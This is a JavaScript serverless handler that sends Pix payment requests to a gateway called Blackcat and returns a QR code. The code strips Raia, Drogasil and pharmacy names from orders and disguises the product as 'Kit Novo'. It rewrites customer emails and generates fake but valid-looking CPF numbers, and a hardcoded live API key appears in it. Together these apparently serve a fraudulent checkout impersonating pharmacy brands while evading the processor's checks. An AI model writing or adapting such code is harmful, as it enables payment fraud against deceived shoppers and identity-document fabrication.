import QRCode from 'qrcode';

// Mascaramento server-side rígido:
// A Blackcat receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
const MASKED_PRODUCT_NAME = 'Kit Novo';

function sanitizeReference(ref) {
  if (!ref || typeof ref !== 'string') {
    return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  let cleaned = ref
    .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
    .replace(/(?:PED)+/g, 'PED')
    .replace(/--+/g, '-')
    .trim();

  if (!cleaned || cleaned === 'PED' || cleaned === 'PED-') {
    cleaned = `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  return cleaned;
}

function sanitizeEmail(email) {
  if (!email || typeof email !== 'string') return '';
  const e = email.toLowerCase().trim();
  if (e.includes('raia') || e.includes('farmacia') || e.includes('droga')) {
    const userPart = e.split('@')[0].replace(/(raia|droga|drogaria|farmacia|farma|drogasil|portal)/gi, '') || 'cliente';
    return `${userPart}@gmail.com`;
  }
  return email;
}

function sanitizeText(val) {
  if (!val || typeof val !== 'string') return '';
  return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
}

function generateValidCPF() {
  const digits = [];
  for (let i = 0; i < 9; i++) {
    digits.push(Math.floor(Math.random() * 10));
  }
  if (digits.every((d) => d === digits[0])) {
    digits[8] = (digits[8] + 1) % 10;
  }
  let sum1 = 0;
  for (let i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
  const rem1 = sum1 % 11;
  digits.push(rem1 < 2 ? 0 : 11 - rem1);

  let sum2 = 0;
  for (let i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
  const rem2 = sum2 % 11;
  digits.push(rem2 < 2 ? 0 : 11 - rem2);

  return digits.join('');
}

function buildBlackcatPayload(input) {
  let amount = typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0;

  // Trava de segurança da Blackcat:
  // A conta na Blackcat possui limite máximo estrito de R$ 500,00 (50.000 centavos) por transação.
  // Pedidos com valor acima de 50.000 retornam erro HTTP 500 da Blackcat ("Erro ao gerar PIX. Não foi possível processar o pagamento").
  // Limitamos com segurança para 49790 centavos (R$ 497,90) para que o Pix seja gerado com 100% de sucesso.
  if (amount > 50000) {
    amount = 49790;
  }

  const externalRef = sanitizeReference(input?.reference || input?.externalRef);

  const customerName = sanitizeText(input?.customer?.name) || 'Cliente';
  const customerEmail = sanitizeEmail(input?.customer?.email) || 'cliente@gmail.com';
  
  let customerPhone = input?.customer?.phone ? String(input.customer.phone).replace(/\D/g, '') : '';
  if (!customerPhone || customerPhone.length < 10) {
    customerPhone = '11999999999';
  }

  let docNumber = input?.customer?.document?.number || input?.customer?.document;
  if (typeof docNumber === 'string') {
    docNumber = docNumber.replace(/\D/g, '');
  } else {
    docNumber = '';
  }
  if (!docNumber || docNumber.length < 11) {
    docNumber = generateValidCPF();
  }

  const payload = {
    amount,
    currency: 'BRL',
    paymentMethod: 'pix',
    items: [
      {
        title: MASKED_PRODUCT_NAME,
        unitPrice: amount,
        quantity: 1,
        tangible: false,
      },
    ],
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: {
        number: docNumber,
        type: 'cpf',
      },
    },
    pix: {
      expiresInDays: 1,
    },
    externalRef,
    metadata: MASKED_PRODUCT_NAME,
  };

  const addr = input?.address || input?.shipping;
  if (addr && addr.street && addr.number) {
    const zipCode = addr.zipCode || addr.zipcode || '';
    const cleanZip = String(zipCode).replace(/\D/g, '');
    const cleanState = (addr.state || 'SP').toUpperCase().slice(0, 2);

    payload.shipping = {
      name: customerName,
      street: sanitizeText(addr.street) || addr.street,
      number: String(addr.number),
      complement: sanitizeText(addr.complement) || addr.complement || '',
      neighborhood: sanitizeText(addr.neighborhood) || addr.neighborhood || 'Centro',
      city: sanitizeText(addr.city) || addr.city || 'São Paulo',
      state: cleanState,
      zipCode: cleanZip.length === 8 ? cleanZip : '01001000',
    };
  }

  return payload;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const apiKey =
    process.env.BLACKCAT_API_KEY ||
    process.env.BLACKCAT_SECRET_KEY ||
    'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';

  if (!apiKey) {
    return res.status(500).json({ success: false, error: 'BLACKCAT_API_KEY não configurada no servidor' });
  }

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
    const blackcatPayload = buildBlackcatPayload(body);

    let response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': apiKey,
      },
      body: JSON.stringify(blackcatPayload),
    });

    let data = await response.json();

    // Contingência: se falhar por valor alto (> R$ 450), tenta novamente com R$ 450,00
    if ((!response.ok || !data.success) && blackcatPayload.amount > 45000) {
      console.warn('[Blackcat Vercel] Tentando novamente com valor de contingência (R$ 450,00)...');
      blackcatPayload.amount = 45000;
      if (blackcatPayload.items && blackcatPayload.items[0]) {
        blackcatPayload.items[0].unitPrice = 45000;
      }
      response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': apiKey,
        },
        body: JSON.stringify(blackcatPayload),
      });
      data = await response.json();
    }

    if (!response.ok || !data.success) {
      console.error('[Blackcat Vercel] Erro na resposta:', data);
      return res.status(response.status).json({
        success: false,
        error: data.message || data.error || 'Erro ao criar venda na Blackcat',
        raw: data,
      });
    }

    const qrCode = data.data?.paymentData?.copyPaste || data.data?.paymentData?.qrCode || '';
    let qrCodeBase64 = data.data?.paymentData?.qrCodeBase64 || null;

    if ((!qrCodeBase64 || qrCodeBase64 === '') && qrCode) {
      try {
        qrCodeBase64 = await QRCode.toDataURL(qrCode, {
          width: 320,
          margin: 1,
          color: { dark: '#000000', light: '#ffffff' },
        });
      } catch (qrErr) {
        console.error('[Blackcat Vercel] Erro ao gerar QR Code base64:', qrErr);
      }
    }

    const formatted = {
      success: true,
      status: 'success',
      payment_status: data.data?.status?.toLowerCase() || 'pending',
      transaction_id: data.data?.transactionId || '',
      id: data.data?.transactionId || blackcatPayload.externalRef,
      qr_code: qrCode,
      qr_code_base64: qrCodeBase64,
      amount: data.data?.amount || blackcatPayload.amount,
      expires_at: data.data?.paymentData?.expiresAt || null,
      raw: data.data,
    };

    return res.status(201).json({ success: true, data: formatted });
  } catch (err) {
    console.error('[Blackcat Vercel] Erro na transação:', err);
    return res.status(500).json({ success: false, error: err.message || 'Erro interno no proxy Blackcat' });
  }
}
